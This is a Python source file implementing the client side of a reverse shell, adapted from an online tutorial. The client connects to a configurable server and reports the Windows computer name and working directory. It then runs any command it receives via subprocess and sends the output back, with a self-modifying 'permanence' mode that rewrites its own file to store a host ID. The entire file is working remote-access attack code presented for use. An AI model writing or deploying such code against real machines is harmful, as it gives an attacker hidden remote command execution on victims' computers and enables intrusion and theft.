import socket
import os
import subprocess
import datetime

# https://www.thepythoncode.com/article/create-reverse-shell-python#:~:text=How%20to%20Create%20a%20Reverse%20Shell%20in%20Python,are%20some%20ideas%20to%20extend%20that%20code%3A%20
ID = ''
SERVER_HOST = '127.0.0.1'  # sys.argv[1]
SERVER_PORT = 2424
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
SEPARATOR = '<sep>'  # separator string for sending 2 messages in one go

COMPUTERNAME = os.environ['COMPUTERNAME']

permanence = False
output = ' '


def set_permanence(_permanence: bool):
    global permanence
    permanence = _permanence
    return permanence


def set_id(_id=COMPUTERNAME):
    global ID
    if permanence:
        with open(__file__, 'r') as fr:
            code_with_id = fr.read().replace('ID = \'\'', f'ID = \'{_id}\'')

        with open(__file__, 'w') as fw:
            print('write with permanence')
            fw.write(code_with_id)
    ID = _id
    return _id


def get_id():
    global ID
    if ID == '':
        set_id()
    return ID


# create the socket object
sock = socket.socket()

# connect to the server
sock.connect((SERVER_HOST, SERVER_PORT))

# get the current directory
current_dir = os.getcwd()
# get the Unique User Identifier
pc_id = get_id()

message = f'{output}{SEPARATOR}{current_dir}{SEPARATOR}{pc_id}'
sock.send(message.encode(encoding='utf-8'))
while True:
    output = ' '
    # receive the command from the server
    command = sock.recv(BUFFER_SIZE).decode().strip()
    if not command:
        continue

    elif command.lower() == '$kill':
        break  # if the command is exit, just break out of the loop
    elif command.lower()[:3] == '$id':
        if len(command) == 3:
            output = get_id()
        else:
            output = set_id(command[3:])
    elif command.lower() == '$p':
        set_permanence(True)
        output = '#$rr ^ PERMANENCE s@*uldn\'t be -_---___ error'
    elif command[:2] == 'cd':  # cd command, change directory (str[start:end:step])
        try:
            # remove cd and remove leading space
            command = command[2:].strip()  # removing ending at the same time because why not

            if len(command) < 3:
                command += 'c:\\'[len(command):]  # c: --> c:\ and c --> c:\                    at least I hope

            os.chdir(command)

        except FileNotFoundError as err:
            output = str(err)  # if there is an error, set as the output

        else:
            output = ''  # if operation is successful, empty message
    elif command.lower() == 'health':
        output = datetime.datetime.now().timestamp()
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)

    # get the current working directory as output
    current_dir = os.getcwd()
    # get the Unique User Identifier
    pc_id = get_id()

    # send the results back to the server
    message = f'{output}{SEPARATOR}{current_dir}{SEPARATOR}{pc_id}'
    sock.send(message.encode(encoding='utf-8'))

sock.close()  # close client connection
